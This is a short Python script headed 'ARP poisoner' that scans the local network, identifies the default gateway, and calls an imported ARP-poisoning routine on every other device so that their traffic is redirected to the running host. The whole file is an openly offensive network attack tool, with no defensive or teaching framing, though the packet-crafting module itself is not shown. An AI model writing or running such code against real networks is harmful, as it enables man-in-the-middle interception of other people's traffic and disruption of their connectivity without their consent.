# ARP poisoner
"""

"""

from multiprocessing import Process
from scapy.all import *
import netifaces

# custom libraries
from networkScanner import Scanner
netScanner = Scanner()

from logger import DataLogging
logger = DataLogging(True)

from ARPer import ARP
arp = ARP()


def main():
    # scan the network for all the devices on the network
    logger.say(f'scanning network')
    IP = netScanner.getOwnIP()
    netMask = "24"
    type = 'ARP'
    deviceList = netScanner.scan(type, IP, netMask)

    logger.say(f'active devices: {deviceList}')

    logger.say(f'poisoning the entire network')

    # identify the gateway
    gws = netifaces.gateways()
    gateway = gws['default'][netifaces.AF_INET][0]

    for device in deviceList:
        if device != IP and device != gateway:
            logger.say(f'poisoning {device} to connect to {IP}')
            arp.ARP_poison(device, IP, True)

    return 1


if __name__ == "__main__":
    main()